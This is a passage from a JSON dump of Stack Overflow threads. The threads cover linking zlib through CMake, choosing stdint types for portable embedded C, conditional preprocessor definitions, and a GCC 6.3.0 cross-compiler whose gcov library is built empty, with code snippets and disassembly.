"edited": false, "score": 0, "creation_date": 1564633177, "post_id": 53298568, "comment_id": 101096749, "body": "@Michael, i have already solved the issue. It is easier once one has mastered CMake."}], "tags": [], "owner": {"reputation": 19856, "user_id": 2266772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60e03bd1fd9f2dbc750e0899b9e7e71d?s=128&d=identicon&r=PG", "display_name": "Matthieu Brucher", "link": "https://stackoverflow.com/users/2266772/matthieu-brucher"}, "is_accepted": false, "score": 14, "last_activity_date": 1583538743, "last_edit_date": 1583538743, "creation_date": 1542192993, "answer_id": 53298568, "question_id": 53298492, "link": "https://stackoverflow.com/questions/53298492/how-to-link-zlib-with-cmake/53298568#53298568", "title": "How to link Zlib with Cmake", "body": "<p>You have to link against zlib.</p>\n\n<p>If you used:</p>\n\n<pre><code>find_package(ZLIB)\n</code></pre>\n\n<p>Then you should have:</p>\n\n<pre><code>target_link_libraries(GzipTest ZLIB::ZLIB)\n</code></pre>\n\n<p>Also don't add the headers to your source files:</p>\n\n<pre><code>add_executable(GzipTest main.cpp)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 371, "user_id": 10838321, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/9Ue8C.jpg?s=128&g=1", "display_name": "Felix Xu", "link": "https://stackoverflow.com/users/10838321/felix-xu"}, "edited": false, "score": 0, "creation_date": 1572658373, "post_id": 56886808, "comment_id": 103638011, "body": "<code>sudo apt-get install zlib1g-dev</code> should be highlighted, it&#39;s important."}, {"owner": {"reputation": 898, "user_id": 2513268, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60b1d52562f5a48bcf47cd98c3b37877?s=128&d=identicon&r=PG", "display_name": "Dotl", "link": "https://stackoverflow.com/users/2513268/dotl"}, "edited": false, "score": 0, "creation_date": 1588455697, "post_id": 56886808, "comment_id": 108904731, "body": "In <code>3.</code>, where is <code>ZLIB_DEPS</code> defined?"}, {"owner": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "edited": false, "score": 0, "creation_date": 1588867319, "post_id": 56886808, "comment_id": 109071818, "body": "<code>ZLIB_DEPS</code> is not defined anywhere. It is being assigned. Like x = 2, where x is the <code>ZLIB_DEPS_DIR</code> and CMAKE_CURRENT_BINARY_DIR is 2."}], "tags": [], "owner": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "is_accepted": false, "score": 3, "last_activity_date": 1575979924, "last_edit_date": 1575979924, "creation_date": 1562239089, "answer_id": 56886808, "question_id": 53298492, "link": "https://stackoverflow.com/questions/53298492/how-to-link-zlib-with-cmake/56886808#56886808", "title": "How to link Zlib with Cmake", "body": "<p>It seems this old post is getting a lot of traction.\nThe solutions to linking zlib with CMake are either: </p>\n\n<ol>\n<li><p>To download zlib, if on Linux with</p>\n\n<pre><code>sudo apt-get install zlib1g-dev\n</code></pre>\n\n<p>and then following what Matthieu proprosed.</p></li>\n<li><p>Or download zlib like in 1 and do:</p>\n\n<pre><code>add_executable(my_executable main.cpp)\ntarget_link_libraries(my_executable z)\n</code></pre></li>\n<li><p>Or just download zlib from their homepage: <a href=\"https://zlib.net/\" rel=\"nofollow noreferrer\">https://zlib.net/</a>, then save it in a 'deps' folder. Modify the CMakeList in the zlib folder with</p>\n\n<pre><code>set(ZLIB_DEPS_DIR ${CMAKE_CURRENT_BINARY_DIR} PARENT_SCOPE)\n</code></pre>\n\n<p>and in the main CMakeList, do</p>\n\n<pre><code>add_executable(my_executable main.cpp)\nadd_subdirectory(deps)\ninclude_directories(my_executable ${ZLIB_DEPS})\ntarget_link_libraries(my_executable zlib)\n</code></pre></li>\n<li>Just learn cmake and you can figure out a way yourself.</li>\n</ol>\n"}], "owner": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 12226, "favorite_count": 2, "answer_count": 2, "score": 10, "last_activity_date": 1583538743, "creation_date": 1542192776, "last_edit_date": 1542193105, "question_id": 53298492, "link": "https://stackoverflow.com/questions/53298492/how-to-link-zlib-with-cmake", "title": "How to link Zlib with Cmake", "body": "<p>I am trying to link my file with the zlib libray but still get: undefined reference to `deflateInit_'.</p>\n\n<p>I am currently using CLion, have downloaded the zLib file from the homepage and added it into the project. This is how my CmakeLists.txt looks like </p>\n\n<pre><code>cmake_minimum_required(VERSION 3.10) project(GzipTest)\n\nset(CMAKE_CXX_STANDARD 11)\n\ninclude_directories(ZLIB zlib-1.2.11)\n\nadd_executable(GzipTest main.cpp zlib-1.2.11/zlib.h)\n</code></pre>\n\n<p>And the code (Copying from the zpipe.c):</p>\n\n<pre><code>include \"iostream\"\n\ninclude \"zlib.h\"\n\ninclude \"iostream\"\n\ndefine CHUNK 1639\n\n\nFILE *fp;\n\n\nint def(FILE *source, FILE *dest, int level){\n    int ret, flush;\n    unsigned have;\n    z_stream strm;\n    unsigned char in[CHUNK];\n    unsigned char out[CHUNK];\n\n    // Allocate Deflate state\n    strm.zalloc = Z_NULL;\n    strm.zfree = Z_NULL;\n    strm.opaque = Z_NULL;\n\n    ret = deflateInit(&amp;strm, level);\n    if (ret != Z_OK){\n        return ret;\n    }\n\n}\n\n\nint main(){\n    fp = fopen(\"inputFile.txt\", \"r\");\n    if (fp == nullptr){\n        perror(\"Could not open data\");\n        exit(EXIT_FAILURE);\n    }\n    def(fp, fp, 1); \n}\n</code></pre>\n\n<p>What could be missing?\nThanks in advance</p>\n"}, {"tags": ["c", "types", "embedded", "bare-metal", "hardware-programming"], "comments": [{"owner": {"reputation": 46684, "user_id": 1527, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2180b1a962bf46e58fa9746cb4ebfb91?s=128&d=identicon&r=PG", "display_name": "Pete Kirkham", "link": "https://stackoverflow.com/users/1527/pete-kirkham"}, "edited": false, "score": 0, "creation_date": 1542193115, "post_id": 53298486, "comment_id": 93477922, "body": "what is the third option?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1542193284, "post_id": 53298486, "comment_id": 93478023, "body": "<a href=\"https://stackoverflow.com/q/20077313/2410359\">uint32_t vs int as a convention for everyday programming</a> may apply here."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 1, "creation_date": 1542194761, "post_id": 53298486, "comment_id": 93478917, "body": "If you want to write portable code (or any C code really), make sure you understand the misfeature of C that is the <i>usual arithmetic conversions</i> and its <i>integer promotion</i> rules. They are as important as types themselves."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1542195049, "post_id": 53298486, "comment_id": 93479063, "body": "Possible dupe: <a href=\"https://stackoverflow.com/questions/9834747/reasons-to-use-or-not-stdint\">Reasons to use (or not) stdint</a>"}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 0, "creation_date": 1542296675, "post_id": 53298486, "comment_id": 93526471, "body": "stdint.h simply translates into the native/actual C types char int long.  within a tool for a specific target, the change is rare. but if porting to another platform (of which much if your code wont port anyway) the stdint approach is good.  stdint approach has the problem of a C library which kinda doesnt work with baremetal and depending on the tool can be a PITA (also the problem of how does the C library insure it works with that compiler (sometimes it doesnt))."}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 0, "creation_date": 1542296805, "post_id": 53298486, "comment_id": 93526565, "body": "the compiler/toolchain determines what the native types are and for example with gcc there is a toolchain specific include that C libraries can use to get the conversion done right (otherwise the C library is just guessing or hoping they dont change just like you would be using native/real C types).  you could try a hybrid which is not as much of a PITA, use the stdint types but take the header from the toolchain or borrow one from a C library but not necessarily use the C library as much if it is not baremetal without a bunch more work to make your own system."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1542642531, "post_id": 53298486, "comment_id": 93631983, "body": "Use stdint.h, either <code>uintn_t</code> or <code>uint_fastn_t</code>. That being said, you need to specify the &quot;best&quot; criteria much more detailed in order to ask such a question here, or answers might just be random opinions."}], "answers": [{"comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1542195481, "post_id": 53298997, "comment_id": 93479283, "body": "Mike, I would add that it is only for integer types that must be of a well-defined width. For normal integer calculations, the normal int could probably be used so you can take benefit of a controler with a larger native int type."}, {"owner": {"reputation": 3478, "user_id": 9061264, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TPing.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/9061264/mike"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1542195654, "post_id": 53298997, "comment_id": 93479373, "body": "@Paul Ogilivie of course, yes!"}], "tags": [], "owner": {"reputation": 3478, "user_id": 9061264, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TPing.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/9061264/mike"}, "is_accepted": true, "score": 2, "last_activity_date": 1542196394, "last_edit_date": 1542196394, "creation_date": 1542194335, "answer_id": 53298997, "question_id": 53298486, "link": "https://stackoverflow.com/questions/53298486/how-to-use-types-in-embedded-c-for-portable-bare-metal-software/53298997#53298997", "title": "How to use types in embedded C for portable bare metal software", "body": "<p>Using the well defined integer types of <code>stdint.h</code> makes it much easier to port your code to another controller. </p>\n\n<p>for example:\nthe size of type <code>int</code> depends on your machine (16 or 32 bit)</p>\n\n<p>And please remember:<br>\nIf you wat to work with the MISRA standard, you are not allowed to use the standard types like <code>int</code>.</p>\n"}], "owner": {"reputation": 1817, "user_id": 4030665, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Dan", "link": "https://stackoverflow.com/users/4030665/dan"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 163, "favorite_count": 0, "closed_date": 1542642556, "accepted_answer_id": 53298997, "answer_count": 1, "score": -1, "last_activity_date": 1542197672, "creation_date": 1542192761, "last_edit_date": 1542197672, "question_id": 53298486, "link": "https://stackoverflow.com/questions/53298486/how-to-use-types-in-embedded-c-for-portable-bare-metal-software", "closed_reason": "Opinion-based", "title": "How to use types in embedded C for portable bare metal software", "body": "<p>I'm writing my first bare metal application in C for a specific micro controller. I want to make it as much portable as possible and I'm not sure what is the proper way for using the C types. I have two options in mind:</p>\n\n<ul>\n<li>Using the typical C standard types such as <code>char</code>, <code>int</code>, <code>long</code> etc.</li>\n<li>Using the types of <code>stdint.h</code> for integer types, such as <code>uint8_t</code>, <code>int32_t</code> etc., and <code>char</code> and <code>double</code> for the rest of the types.</li>\n</ul>\n\n<p><strong>Which option is the best one?</strong></p>\n"}, {"tags": ["c", "c-preprocessor", "conditional-compilation"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1542192486, "post_id": 53298349, "comment_id": 93477574, "body": "Unrelated to your question, but don&#39;t <i>define</i> variables in header files, just <i>declare</i> them instead. Also, global variables should be avoided."}, {"owner": {"reputation": 155, "user_id": 3154403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/356b6b1442238daa809a50b4e6830e53?s=128&d=identicon&r=PG&f=1", "display_name": "alain", "link": "https://stackoverflow.com/users/3154403/alain"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1542192668, "post_id": 53298349, "comment_id": 93477668, "body": "I know about this but I just wanted to keep the example as simple as possible. Consider that a and b can be wathever code. I edited the question"}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1542192771, "post_id": 53298349, "comment_id": 93477728, "body": "Please don&#39;t edit your question significantly once you have one or more answers, since it can invalidate the existing answer(s)."}, {"owner": {"reputation": 155, "user_id": 3154403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/356b6b1442238daa809a50b4e6830e53?s=128&d=identicon&r=PG&f=1", "display_name": "alain", "link": "https://stackoverflow.com/users/3154403/alain"}, "edited": false, "score": 0, "creation_date": 1542192860, "post_id": 53298349, "comment_id": 93477780, "body": "Didn&#39;t see your answer. Sorry"}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1542192882, "post_id": 53298349, "comment_id": 93477793, "body": "No problem - I rolled back your edit."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 2, "creation_date": 1542193100, "post_id": 53298349, "comment_id": 93477916, "body": "While conditional compilation is sometimes necessary, it should be minimized when possible. There are often better ways to do things, but your example is a bit too abstract to offer any better workaround. To me this seems like XY problem."}, {"owner": {"reputation": 2127, "user_id": 1819452, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/3ad224b55add66c22f62380dea203e75?s=128&d=identicon&r=PG", "display_name": "Vroomfondel", "link": "https://stackoverflow.com/users/1819452/vroomfondel"}, "edited": false, "score": 0, "creation_date": 1542213887, "post_id": 53298349, "comment_id": 93490865, "body": "Out of pure curiosity: what kind of configuration management do you try to achieve with this? Is this just a minuscle side path which justifies such ad-hoc solutions or is the config there a central functionality of your software product?"}, {"owner": {"reputation": 155, "user_id": 3154403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/356b6b1442238daa809a50b4e6830e53?s=128&d=identicon&r=PG&f=1", "display_name": "alain", "link": "https://stackoverflow.com/users/3154403/alain"}, "edited": false, "score": 0, "creation_date": 1542271432, "post_id": 53298349, "comment_id": 93511011, "body": "Actually, I am implementing unit tests. Now imagine a and b are two structures used for mapping purposes, e.g. GPIO, that are related to different architectures. Thus, the need to exclude a or b depending on the architecture I am building for. Anyway, I would like to build my unit test disregarding the architecture, and this led me to this question."}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1542702946, "post_id": 53298349, "comment_id": 93653457, "body": "@alain, unit tests must use <i>the same, or most similar</i> code to final code, just because if you use different code to test than the production code, you can be hiding in the tests code that is used in production (or it can be used differently, just hiding the failure).  Try to reduce at maximum the differences between code to test against production code."}], "answers": [{"tags": [], "owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "is_accepted": true, "score": 4, "last_activity_date": 1542192581, "creation_date": 1542192581, "answer_id": 53298427, "question_id": 53298349, "link": "https://stackoverflow.com/questions/53298349/how-to-void-if-else-preprocessor-macro-with-another-define/53298427#53298427", "title": "How to void if/else preprocessor macro with another define?", "body": "<p>Just treat the two variables separately and determine the logic for when each should be defined:</p>\n\n<pre><code>#if defined(A) || defined(B)\n    int a;\n#endif\n#if !defined(A) || defined(B)\n    int b;\n#endif\n</code></pre>\n"}], "owner": {"reputation": 155, "user_id": 3154403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/356b6b1442238daa809a50b4e6830e53?s=128&d=identicon&r=PG&f=1", "display_name": "alain", "link": "https://stackoverflow.com/users/3154403/alain"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 59, "favorite_count": 0, "accepted_answer_id": 53298427, "answer_count": 1, "score": 0, "last_activity_date": 1542192780, "creation_date": 1542192308, "last_edit_date": 1542192780, "question_id": 53298349, "link": "https://stackoverflow.com/questions/53298349/how-to-void-if-else-preprocessor-macro-with-another-define", "title": "How to void if/else preprocessor macro with another define?", "body": "<p>Suppose I have a c header file test.h</p>\n\n<pre><code>// test.h\n#ifdef A\n    int a;\n#else\n    int b;\n#endif\n</code></pre>\n\n<p>Now suppose I want to build my code in such a way that both <code>a</code> and <code>b</code> are defined if B is defined.\nIs there a smarter way rather than:</p>\n\n<pre><code>// test.h\n#ifndef B\n#ifdef A\n    int a;\n#else\n    int b;\n#endif\n#else\n    int a;\n    int b;\n#endif\n</code></pre>\n\n<p>?</p>\n\n<p>Thanks</p>\n"}, {"tags": ["c++", "c", "gcc", "code-coverage", "gcov"], "comments": [{"owner": {"reputation": 19856, "user_id": 2266772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60e03bd1fd9f2dbc750e0899b9e7e71d?s=128&d=identicon&r=PG", "display_name": "Matthieu Brucher", "link": "https://stackoverflow.com/users/2266772/matthieu-brucher"}, "edited": false, "score": 0, "creation_date": 1542191956, "post_id": 53298186, "comment_id": 93477242, "body": "Are you using the full flags? <code>--coverage -fprofile-arcs -ftest-coverage</code>"}, {"owner": {"reputation": 11, "user_id": 10651301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbb5f8677cd3260f302900ad8b6e5b82?s=128&d=identicon&r=PG&f=1", "display_name": "DNO", "link": "https://stackoverflow.com/users/10651301/dno"}, "reply_to_user": {"reputation": 19856, "user_id": 2266772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60e03bd1fd9f2dbc750e0899b9e7e71d?s=128&d=identicon&r=PG", "display_name": "Matthieu Brucher", "link": "https://stackoverflow.com/users/2266772/matthieu-brucher"}, "edited": false, "score": 0, "creation_date": 1542192202, "post_id": 53298186, "comment_id": 93477391, "body": "Yes, I have tried the &quot;full&quot; flags -fprofile-arcs -ftest-coverage and the one --coverage flag. The exe compiled with GCC4.1.2 creates gdca files when executing, in both cases, the exe compiled with GCC6.3.0 just do not create gdca files. In all cases, using both compilers, with both usage of compile flags, the *.gcno files are generated."}, {"owner": {"reputation": 16482, "user_id": 5632316, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/9I9Vm.jpg?s=128&g=1", "display_name": "Oliv", "link": "https://stackoverflow.com/users/5632316/oliv"}, "edited": false, "score": 0, "creation_date": 1542193710, "post_id": 53298186, "comment_id": 93478292, "body": "Could you show the compilation command line?"}, {"owner": {"reputation": 11, "user_id": 10651301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbb5f8677cd3260f302900ad8b6e5b82?s=128&d=identicon&r=PG&f=1", "display_name": "DNO", "link": "https://stackoverflow.com/users/10651301/dno"}, "edited": false, "score": 0, "creation_date": 1542195358, "post_id": 53298186, "comment_id": 93479223, "body": "&quot;./i686-elf-gcc.exe&quot; -MD -x c++ &quot;C:/Test1/Logical/ProgramCpp/Main.cpp&quot;  -o &quot;C:/Test1/Temp/Objects/GCC630/PC/ProgramCpp/Main.cpp.o&quot; &quot;-IC:/GnuInst/V6.3.0/lib/gcc/i686-elf/6.3.0/include&quot; &quot;-IC:/GnuInst/V6.3.0/i686-elf/include&quot; &quot;-IC:/GnuInst/V6.3.0/include/c++/6.3.0&quot; &quot;-IC:/GnuInst/V6.3.0/include/c++/6.3.0/i686-elf&quot; -specs=I386specs_brelf &quot;-IC:/Test1/Logical/ProgramCpp&quot; &quot;-IC:/Test1/Temp/Includes/ProgramCpp&quot; &quot;-IC:/Test1/Temp/Includes&quot;"}, {"owner": {"reputation": 11, "user_id": 10651301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbb5f8677cd3260f302900ad8b6e5b82?s=128&d=identicon&r=PG&f=1", "display_name": "DNO", "link": "https://stackoverflow.com/users/10651301/dno"}, "edited": false, "score": 0, "creation_date": 1542195366, "post_id": 53298186, "comment_id": 93479229, "body": "-trigraphs -fno-asm -D _DEFAULT_INCLUDES -D _SG4 -fPIC -O0 -g -Wall  -include &quot;C:/Test1/Temp/Objects/GCC630/PC/Libraries.h&quot; --coverage -fprofile-arcs -ftest-coverage --coverage -c"}, {"owner": {"reputation": 11, "user_id": 10651301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbb5f8677cd3260f302900ad8b6e5b82?s=128&d=identicon&r=PG&f=1", "display_name": "DNO", "link": "https://stackoverflow.com/users/10651301/dno"}, "edited": false, "score": 0, "creation_date": 1542210296, "post_id": 53298186, "comment_id": 93488611, "body": "object dump of the exe compiled with gcc6.3.0 with coverage flags: 00003170 &lt;__gcov_init&gt;:     3170:\tf3 c3                \trepz ret      3172:\t66 90                \txchg   %ax,%ax     3174:\t66 90                \txchg   %ax,%ax     3176:\t66 90                \txchg   %ax,%ax     3178:\t66 90                \txchg   %ax,%ax     317a:\t66 90                \txchg   %ax,%ax     317c:\t66 90                \txchg   %ax,%ax     317e:\t66 90                \txchg   %ax,%ax Looks to me like there was no code compiled at all for the __gcov_init function...."}], "answers": [{"tags": [], "owner": {"reputation": 11, "user_id": 10651301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbb5f8677cd3260f302900ad8b6e5b82?s=128&d=identicon&r=PG&f=1", "display_name": "DNO", "link": "https://stackoverflow.com/users/10651301/dno"}, "is_accepted": false, "score": 0, "last_activity_date": 1543323122, "last_edit_date": 1543323122, "creation_date": 1543321494, "answer_id": 53499659, "question_id": 53298186, "link": "https://stackoverflow.com/questions/53298186/gcc6-3-0-flag-coverage-not-functioning-no-gdca-files-generated/53499659#53499659", "title": "GCC6.3.0: flag &quot;--coverage&quot; not functioning (no gdca files generated)", "body": "<p>When the target != host, and your libc flag is set to true, you will not get the gcov library implemented, object dump of gcov.a shows no implementation. In such a case, set the <strong>inhibit-libc</strong> flag for libgcc to false, recompile and you have gcov implemented.</p>\n"}], "owner": {"reputation": 11, "user_id": 10651301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbb5f8677cd3260f302900ad8b6e5b82?s=128&d=identicon&r=PG&f=1", "display_name": "DNO", "link": "https://stackoverflow.com/users/10651301/dno"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 393, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1585561610, "creation_date": 1542191799, "last_edit_date": 1542191823, "question_id": 53298186, "link": "https://stackoverflow.com/questions/53298186/gcc6-3-0-flag-coverage-not-functioning-no-gdca-files-generated", "title": "GCC6.3.0: flag &quot;--coverage&quot; not functioning (no gdca files generated)", "body": "<p>Having a code snippet in C and the same in C++, which generates gdca files executing the exe which is compiled with GCC 4.1.2. \nThe same code snippet compiled with GCC6.3.0 after executing is not generating gdca files, not the C.exe not the c++.exe</p>\n\n<p>I found out that the implementation of the gcov library is different, in GCC4.1.2 and GCC6.3.0, the version of the gcov library in GCC6.3.0 seems to be empty:</p>\n\n<pre><code>_gcov_merge_add.o:     file format elf32-i386\n\nDisassembly of section .text:\n00000000 &lt;__gcov_merge_add&gt;:\n   0: 55                    push   %ebp\n   1: 89 e5                 mov    %esp,%ebp\n   3: 5d                    pop    %ebp\n   4: c3                    ret\n_gcov_merge_single.o:     file format elf32-i386\n\nDisassembly of section .text:\n00000000 &lt;__gcov_merge_single&gt;:\n   0: 55                    push   %ebp\n   1: 89 e5                 mov    %esp,%ebp\n   3: 5d                    pop    %ebp\n   4: c3                    ret\n_gcov_merge_delta.o:     file format elf32-i386\n\nDisassembly of section .text:\n00000000 &lt;__gcov_merge_delta&gt;:\n   0: 55                    push   %ebp\n   1: 89 e5                 mov    %esp,%ebp\n   3: 5d                    pop    %ebp\n   4: c3                    ret\n_gcov_merge_ior.o:     file format elf32-i386\n_gcov_merge_time_profile.o:     file format elf32-i386\n_gcov_merge_icall_topn.o:     file format elf32-i386\n_gcov_interval_profiler.o:     file format elf32-i386\n_gcov_pow2_profiler.o:     file format elf32-i386\n_gcov_one_value_profiler.o:     file format elf32-i386\n_gcov_indirect_call_profiler.o:     file format elf32-i386\n_gcov_average_profiler.o:     file format elf32-i386\n_gcov_ior_profiler.o:     file format elf32-i386\n\n_gcov_indirect_call_profiler_v2.o:     file format elf32-i386\n\n_gcov_time_profiler.o:     file format elf32-i386\n_gcov_indirect_call_topn_profiler.o:     file format elf32-i386\n_gcov_dump.o:     file format elf32-i386\n\nDisassembly of section .text:\n00000000 &lt;__gcov_dump&gt;:\n   0: 55                    push   %ebp\n   1: 89 e5                 mov    %esp,%ebp\n   3: 5d                    pop    %ebp\n   4: c3                    ret\n_gcov_flush.o:     file format elf32-i386\n\nDisassembly of section .text:\n00000000 &lt;__gcov_flush&gt;:\n   0: 55                    push   %ebp\n   1: 89 e5                 mov    %esp,%ebp\n   3: 5d                    pop    %ebp\n   4: c3                    ret\n_gcov_fork.o:     file format elf32-i386\n_gcov_execl.o:     file format elf32-i386\n_gcov_execlp.o:     file format elf32-i386\n_gcov_execle.o:     file format elf32-i386\n_gcov_execv.o:     file format elf32-i386\n_gcov_execvp.o:     file format elf32-i386\n_gcov_execve.o:     file format elf32-i386\n_gcov_reset.o:     file format elf32-i386\n\nDisassembly of section .text:\n00000000 &lt;__gcov_reset&gt;:\n   0: 55                    push   %ebp\n   1: 89 e5                 mov    %esp,%ebp\n   3: 5d                    pop    %ebp\n   4: c3                    ret\n_gcov.o:     file format elf32-i386\n\nDisassembly of section .text:\n00000000 &lt;__gcov_init&gt;:\n   0: 55                    push   %ebp\n   1: 89 e5                 mov    %esp,%ebp\n   3: 5d                    pop    %ebp\n   4: c3                    ret\n\nThe gcov within the GCC 6.3.0 was build with following flags:\n\n/usr/gnu/gcc/V6.3.0/gcc-6.3.0_build/./gcc/xgcc\n-B/usr/gnu/gcc/V6.3.0/gcc-6.3.0_build/./gcc/\n-B/opt/V6.3.0/i686-elf/bin/ -B/opt/V6.3.0/i686-elf/lib/ -isystem\n/opt/V6.3.0/i686-elf/include -isystem /opt/V6.3.0/i686-elf/sys-include\n-fpic -O2 -mpreferred-stack-boundary=3 -O2  -fpic -O2\n-mpreferred-stack-boundary=3 -DIN_GCC  -DCROSS_DIRECTORY_STRUCTURE  -W\n-Wall -Wno-narrowing -Wwrite-strings -Wcast-qual -Wstrict-prototypes\n-Wmissing-prototypes -Wold-style-definition  -isystem ./include\n-fpic -g -DIN_LIBGCC2 -fbuilding-libgcc -fno-stack-protector\n-Dinhibit_libc  -fpic -I. -I. -I../.././gcc\n-I../../../gcc-6.3.0/libgcc 